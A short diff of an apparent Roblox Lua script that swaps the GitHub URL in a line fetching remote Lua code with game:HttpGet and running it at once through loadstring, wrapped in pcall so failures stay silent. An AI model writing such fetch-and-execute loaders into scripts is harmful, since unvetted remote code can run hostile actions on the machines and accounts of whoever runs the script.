@@ -51,7 +51,7 @@ local function safeCall(context, callback, ...)
 end
 
 pcall(function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/Jilxi/123/refs/heads/main/1.lua"))()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/MelyOVO/B/refs/heads/main/F.lua"))()
 end)
 
 local ToggleUI = false
